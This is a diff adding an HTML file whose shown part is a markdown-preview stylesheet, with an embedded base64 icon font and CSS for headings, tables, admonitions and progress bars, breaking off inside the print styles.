@@ -1,0 +1,2084 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {
+  max-width: 980px;
+  border: 1px solid #ddd;
+  outline: 1300px solid #fff;
+  margin: 16px auto;
+}
+
+body .markdown-body
+{
+  padding: 45px;
+}
+
+@font-face {
+  font-family: fontawesome-mini;
+  src: url(data:font/woff;charset=utf-8;base64,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) format('woff');
+}
+
+.markdown-body {
+  font-family: sans-serif;
+  -ms-text-size-adjust: 100%;
+  -webkit-text-size-adjust: 100%;
+  color: #333333;
+  overflow: hidden;
+  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
+  font-size: 16px;
+  line-height: 1.6;
+  word-wrap: break-word;
+}
+
+.markdown-body a {
+  background: transparent;
+}
+
+.markdown-body a:active,
+.markdown-body a:hover {
+  outline: 0;
+}
+
+.markdown-body b,
+.markdown-body strong {
+  font-weight: bold;
+}
+
+.markdown-body mark {
+  background: #ff0;
+  color: #000;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body sub,
+.markdown-body sup {
+  font-size: 75%;
+  line-height: 0;
+  position: relative;
+  vertical-align: baseline;
+}
+.markdown-body sup {
+  top: -0.5em;
+}
+.markdown-body sub {
+  bottom: -0.25em;
+}
+
+.markdown-body h1 {
+  font-size: 2em;
+  margin: 0.67em 0;
+}
+
+.markdown-body img {
+  border: 0;
+}
+
+.markdown-body hr {
+  -moz-box-sizing: content-box;
+  box-sizing: content-box;
+  height: 0;
+}
+
+.markdown-body pre {
+  overflow: auto;
+}
+
+.markdown-body code,
+.markdown-body kbd,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: monospace, monospace;
+  font-size: 1em;
+}
+
+.markdown-body input {
+  color: inherit;
+  font: inherit;
+  margin: 0;
+}
+
+.markdown-body html input[disabled] {
+  cursor: default;
+}
+
+.markdown-body input {
+  line-height: normal;
+}
+
+.markdown-body input[type="checkbox"] {
+  box-sizing: border-box;
+  padding: 0;
+}
+
+.markdown-body table {
+  border-collapse: collapse;
+  border-spacing: 0;
+}
+
+.markdown-body td,
+.markdown-body th {
+  padding: 0;
+}
+
+.markdown-body .codehilitetable {
+  border: 0;
+  border-spacing: 0;
+}
+
+.markdown-body .codehilitetable tr {
+  border: 0;
+}
+
+.markdown-body .codehilitetable pre,
+.markdown-body .codehilitetable div.codehilite {
+  margin: 0;
+}
+
+.markdown-body .linenos,
+.markdown-body .code,
+.markdown-body .codehilitetable td {
+  border: 0;
+  padding: 0;
+}
+
+.markdown-body td:not(.linenos) .linenodiv {
+  padding: 0 !important;
+}
+
+.markdown-body .code {
+  width: 100%;
+}
+
+.markdown-body .linenos div pre,
+.markdown-body .linenodiv pre,
+.markdown-body .linenodiv {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-left-radius: 3px;
+  -webkit-border-bottom-left-radius: 3px;
+  -moz-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px;
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+
+.markdown-body .code div pre,
+.markdown-body .code div {
+  border: 0;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-right-radius: 3px;
+  -webkit-border-bottom-right-radius: 3px;
+  -moz-border-radius-topright: 3px;
+  -moz-border-radius-bottomright: 3px;
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+
+.markdown-body * {
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body input {
+  font: 13px Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
+  line-height: 1.4;
+}
+
+.markdown-body a {
+  color: #4183c4;
+  text-decoration: none;
+}
+
+.markdown-body a:hover,
+.markdown-body a:focus,
+.markdown-body a:active {
+  text-decoration: underline;
+}
+
+.markdown-body hr {
+  height: 0;
+  margin: 15px 0;
+  overflow: hidden;
+  background: transparent;
+  border: 0;
+  border-bottom: 1px solid #ddd;
+}
+
+.markdown-body hr:before,
+.markdown-body hr:after {
+  display: table;
+  content: " ";
+}
+
+.markdown-body hr:after {
+  clear: both;
+}
+
+.markdown-body h1,
+.markdown-body h2,
+.markdown-body h3,
+.markdown-body h4,
+.markdown-body h5,
+.markdown-body h6 {
+  margin-top: 15px;
+  margin-bottom: 15px;
+  line-height: 1.1;
+}
+
+.markdown-body h1 {
+  font-size: 30px;
+}
+
+.markdown-body h2 {
+  font-size: 21px;
+}
+
+.markdown-body h3 {
+  font-size: 16px;
+}
+
+.markdown-body h4 {
+  font-size: 14px;
+}
+
+.markdown-body h5 {
+  font-size: 12px;
+}
+
+.markdown-body h6 {
+  font-size: 11px;
+}
+
+.markdown-body blockquote {
+  margin: 0;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding: 0;
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body ol ol,
+.markdown-body ul ol {
+  list-style-type: lower-roman;
+}
+
+.markdown-body ul ul ol,
+.markdown-body ul ol ol,
+.markdown-body ol ul ol,
+.markdown-body ol ol ol {
+  list-style-type: lower-alpha;
+}
+
+.markdown-body dd {
+  margin-left: 0;
+}
+
+.markdown-body code,
+.markdown-body pre,
+.markdown-body samp {
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  font-size: 12px;
+}
+
+.markdown-body pre {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body kbd {
+  background-color: #e7e7e7;
+  background-image: -moz-linear-gradient(#fefefe, #e7e7e7);
+  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
+  background-image: linear-gradient(#fefefe, #e7e7e7);
+  background-repeat: repeat-x;
+  border-radius: 2px;
+  border: 1px solid #cfcfcf;
+  color: #000;
+  padding: 3px 5px;
+  line-height: 10px;
+  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  display: inline-block;
+}
+
+.markdown-body>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+.markdown-body .headerlink {
+  font: normal 400 16px fontawesome-mini;
+  vertical-align: middle;
+  margin-left: -16px;
+  float: left;
+  display: inline-block;
+  text-decoration: none;
+  opacity: 0;
+  color: #333;
+}
+
+.markdown-body .headerlink:focus {
+  outline: none;
+}
+
+.markdown-body h1 .headerlink {
+  margin-top: 0.8rem;
+}
+
+.markdown-body h2 .headerlink,
+.markdown-body h3 .headerlink {
+  margin-top: 0.6rem;
+}
+
+.markdown-body h4 .headerlink {
+  margin-top: 0.2rem;
+}
+
+.markdown-body h5 .headerlink,
+.markdown-body h6 .headerlink {
+  margin-top: 0;
+}
+
+.markdown-body .headerlink:hover,
+.markdown-body h1:hover .headerlink,
+.markdown-body h2:hover .headerlink,
+.markdown-body h3:hover .headerlink,
+.markdown-body h4:hover .headerlink,
+.markdown-body h5:hover .headerlink,
+.markdown-body h6:hover .headerlink {
+  opacity: 1;
+  text-decoration: none;
+}
+
+.markdown-body h1 {
+  padding-bottom: 0.3em;
+  font-size: 2.25em;
+  line-height: 1.2;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h2 {
+  padding-bottom: 0.3em;
+  font-size: 1.75em;
+  line-height: 1.225;
+  border-bottom: 1px solid #eee;
+}
+
+.markdown-body h3 {
+  font-size: 1.5em;
+  line-height: 1.43;
+}
+
+.markdown-body h4 {
+  font-size: 1.25em;
+}
+
+.markdown-body h5 {
+  font-size: 1em;
+}
+
+.markdown-body h6 {
+  font-size: 1em;
+  color: #777;
+}
+
+.markdown-body p,
+.markdown-body blockquote,
+.markdown-body ul,
+.markdown-body ol,
+.markdown-body dl,
+.markdown-body table,
+.markdown-body pre,
+.markdown-body .admonition {
+  margin-top: 0;
+  margin-bottom: 16px;
+}
+
+.markdown-body hr {
+  height: 4px;
+  padding: 0;
+  margin: 16px 0;
+  background-color: #e7e7e7;
+  border: 0 none;
+}
+
+.markdown-body ul,
+.markdown-body ol {
+  padding-left: 2em;
+}
+
+.markdown-body ul ul,
+.markdown-body ul ol,
+.markdown-body ol ol,
+.markdown-body ol ul {
+  margin-top: 0;
+  margin-bottom: 0;
+}
+
+.markdown-body li>p {
+  margin-top: 16px;
+}
+
+.markdown-body dl {
+  padding: 0;
+}
+
+.markdown-body dl dt {
+  padding: 0;
+  margin-top: 16px;
+  font-size: 1em;
+  font-style: italic;
+  font-weight: bold;
+}
+
+.markdown-body dl dd {
+  padding: 0 16px;
+  margin-bottom: 16px;
+}
+
+.markdown-body blockquote {
+  padding: 0 15px;
+  color: #777;
+  border-left: 4px solid #ddd;
+}
+
+.markdown-body blockquote>:first-child {
+  margin-top: 0;
+}
+
+.markdown-body blockquote>:last-child {
+  margin-bottom: 0;
+}
+
+.markdown-body table {
+  display: block;
+  width: 100%;
+  overflow: auto;
+  word-break: normal;
+  word-break: keep-all;
+}
+
+.markdown-body table th {
+  font-weight: bold;
+}
+
+.markdown-body table th,
+.markdown-body table td {
+  padding: 6px 13px;
+  border: 1px solid #ddd;
+}
+
+.markdown-body table tr {
+  background-color: #fff;
+  border-top: 1px solid #ccc;
+}
+
+.markdown-body table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+.markdown-body img {
+  max-width: 100%;
+  -moz-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.markdown-body code,
+.markdown-body samp {
+  padding: 0;
+  padding-top: 0.2em;
+  padding-bottom: 0.2em;
+  margin: 0;
+  font-size: 85%;
+  background-color: rgba(0,0,0,0.04);
+  border-radius: 3px;
+}
+
+.markdown-body code:before,
+.markdown-body code:after {
+  letter-spacing: -0.2em;
+  content: "\00a0";
+}
+
+.markdown-body pre>code {
+  padding: 0;
+  margin: 0;
+  font-size: 100%;
+  word-break: normal;
+  white-space: pre;
+  background: transparent;
+  border: 0;
+}
+
+.markdown-body .codehilite {
+  margin-bottom: 16px;
+}
+
+.markdown-body .codehilite pre,
+.markdown-body pre {
+  padding: 16px;
+  overflow: auto;
+  font-size: 85%;
+  line-height: 1.45;
+  background-color: #f7f7f7;
+  border-radius: 3px;
+}
+
+.markdown-body .codehilite pre {
+  margin-bottom: 0;
+  word-break: normal;
+}
+
+.markdown-body pre {
+  word-wrap: normal;
+}
+
+.markdown-body pre code {
+  display: inline;
+  max-width: initial;
+  padding: 0;
+  margin: 0;
+  overflow: initial;
+  line-height: inherit;
+  word-wrap: normal;
+  background-color: transparent;
+  border: 0;
+}
+
+.markdown-body pre code:before,
+.markdown-body pre code:after {
+  content: normal;
+}
+
+/* Admonition */
+.markdown-body .admonition {
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  position: relative;
+  border-radius: 3px;
+  border: 1px solid #e0e0e0;
+  border-left: 6px solid #333;
+  padding: 10px 10px 10px 30px;
+}
+
+.markdown-body .admonition table {
+  color: #333;
+}
+
+.markdown-body .admonition p {
+  padding: 0;
+}
+
+.markdown-body .admonition-title {
+  font-weight: bold;
+  margin: 0;
+}
+
+.markdown-body .admonition>.admonition-title {
+  color: #333;
+}
+
+.markdown-body .attention>.admonition-title {
+  color: #a6d796;
+}
+
+.markdown-body .caution>.admonition-title {
+  color: #d7a796;
+}
+
+.markdown-body .hint>.admonition-title {
+  color: #96c6d7;
+}
+
+.markdown-body .danger>.admonition-title {
+  color: #c25f77;
+}
+
+.markdown-body .question>.admonition-title {
+  color: #96a6d7;
+}
+
+.markdown-body .note>.admonition-title {
+  color: #d7c896;
+}
+
+.markdown-body .admonition:before,
+.markdown-body .attention:before,
+.markdown-body .caution:before,
+.markdown-body .hint:before,
+.markdown-body .danger:before,
+.markdown-body .question:before,
+.markdown-body .note:before {
+  font: normal normal 16px fontawesome-mini;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  line-height: 1.5;
+  color: #333;
+  position: absolute;
+  left: 0;
+  top: 0;
+  padding-top: 10px;
+  padding-left: 10px;
+}
+
+.markdown-body .admonition:before {
+  content: "\f056\00a0";
+  color: 333;
+}
+
+.markdown-body .attention:before {
+  content: "\f058\00a0";
+  color: #a6d796;
+}
+
+.markdown-body .caution:before {
+  content: "\f06a\00a0";
+  color: #d7a796;
+}
+
+.markdown-body .hint:before {
+  content: "\f05a\00a0";
+  color: #96c6d7;
+}
+
+.markdown-body .danger:before {
+  content: "\f057\00a0";
+  color: #c25f77;
+}
+
+.markdown-body .question:before {
+  content: "\f059\00a0";
+  color: #96a6d7;
+}
+
+.markdown-body .note:before {
+  content: "\f040\00a0";
+  color: #d7c896;
+}
+
+.markdown-body .admonition::after {
+  content: normal;
+}
+
+.markdown-body .attention {
+  border-left: 6px solid #a6d796;
+}
+
+.markdown-body .caution {
+  border-left: 6px solid #d7a796;
+}
+
+.markdown-body .hint {
+  border-left: 6px solid #96c6d7;
+}
+
+.markdown-body .danger {
+  border-left: 6px solid #c25f77;
+}
+
+.markdown-body .question {
+  border-left: 6px solid #96a6d7;
+}
+
+.markdown-body .note {
+  border-left: 6px solid #d7c896;
+}
+
+.markdown-body .admonition>*:first-child {
+  margin-top: 0 !important;
+}
+
+.markdown-body .admonition>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* progress bar*/
+.markdown-body .progress {
+  display: block;
+  width: 300px;
+  margin: 10px 0;
+  height: 24px;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #ededed;
+  position: relative;
+  box-shadow: inset -1px 1px 3px rgba(0, 0, 0, .1);
+}
+
+.markdown-body .progress-label {
+  position: absolute;
+  text-align: center;
+  font-weight: bold;
+  width: 100%; margin: 0;
+  line-height: 24px;
+  color: #333;
+  text-shadow: 1px 1px 0 #fefefe, -1px -1px 0 #fefefe, -1px 1px 0 #fefefe, 1px -1px 0 #fefefe, 0 1px 0 #fefefe, 0 -1px 0 #fefefe, 1px 0 0 #fefefe, -1px 0 0 #fefefe, 1px 1px 2px #000;
+  -webkit-font-smoothing: antialiased !important;
+  white-space: nowrap;
+  overflow: hidden;
+}
+
+.markdown-body .progress-bar {
+  height: 24px;
+  float: left;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  background-color: #96c6d7;
+  box-shadow: inset 0 1px 0 rgba(255, 255, 255, .5), inset 0 -1px 0 rgba(0, 0, 0, .1);
+  background-size: 30px 30px;
+  background-image: -webkit-linear-gradient(
+    135deg, rgba(255, 255, 255, .4) 27%,
+    transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%,
+    transparent 77%, transparent
+  );
+  background-image: -moz-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -ms-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: -o-linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+  background-image: linear-gradient(
+    135deg,
+    rgba(255, 255, 255, .4) 27%, transparent 27%,
+    transparent 52%, rgba(255, 255, 255, .4) 52%,
+    rgba(255, 255, 255, .4) 77%, transparent 77%,
+    transparent
+  );
+}
+
+.markdown-body .progress-100plus .progress-bar {
+  background-color: #a6d796;
+}
+
+.markdown-body .progress-80plus .progress-bar {
+  background-color: #c6d796;
+}
+
+.markdown-body .progress-60plus .progress-bar {
+  background-color: #d7c896;
+}
+
+.markdown-body .progress-40plus .progress-bar {
+  background-color: #d7a796;
+}
+
+.markdown-body .progress-20plus .progress-bar {
+  background-color: #d796a6;
+}
+
+.markdown-body .progress-0plus .progress-bar {
+  background-color: #c25f77;
+}
+
+.markdown-body .candystripe-animate .progress-bar{
+  -webkit-animation: animate-stripes 3s linear infinite;
+  -moz-animation: animate-stripes 3s linear infinite;
+  animation: animate-stripes 3s linear infinite;
+}
+
+@-webkit-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@-moz-keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+@keyframes animate-stripes {
+  0% {
+    background-position: 0 0;
+  }
+
+  100% {
+    background-position: 60px 0;
+  }
+}
+
+.markdown-body .gloss .progress-bar {
+  box-shadow:
+    inset 0 4px 12px rgba(255, 255, 255, .7),
+    inset 0 -12px 0 rgba(0, 0, 0, .05);
+}
+
+/* MultiMarkdown Critic Blocks */
+.markdown-body .critic_mark {
+  background: #ff0;
+}
+
+.markdown-body .critic_delete {
+  color: #c82829;
+  text-decoration: line-through;
+}
+
+.markdown-body .critic_insert {
+  color: #718c00 ;
+  text-decoration: underline;
+}
+
+.markdown-body .critic_comment {
+  color: #8e908c;
+  font-style: italic;
+}
+
+.markdown-body .headeranchor {
+  font: normal normal 16px fontawesome-mini;
+  line-height: 1;
+  display: inline-block;
+  text-decoration: none;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+.headeranchor:before {
+  content: '\e157';
+}
+
+.markdown-body .task-list-item {
+  list-style-type: none;
+}
+
+.markdown-body .task-list-item+.task-list-item {
+  margin-top: 3px;
+}
+
+.markdown-body .task-list-item input {
+  margin: 0 4px 0.25em -20px;
+  vertical-align: middle;
+}
+
+/* Media */
+@media only screen and (min-width: 480px) {
+  .markdown-body {
+    font-size:14px;
+  }
+}
+
+@media only screen and (min-width: 768px) {
+  .markdown-body {
+    font-size:16px;
+  }
+}
+
+@media print {
+  .markdown-body * {
+    background: transparent !important;
+    color: black !important;
+    filter:none !important;
+    -ms-filter: none !important;
+  }
+
+  .markdown-body {
+    font-size:12pt;
+    max-width:100%;
+    outline:none;
+    border: 0;
+  }
+
+  .markdown-body a,
+  .markdown-body a:visited {
+    text-decoration: underline;
+  }
+
+  .markdown-body .headeranchor-link {
+    display: none;
+  }
+
+  .markdown-body a[href]:after {
+    content: " (" attr(href) ")";
+  }
+
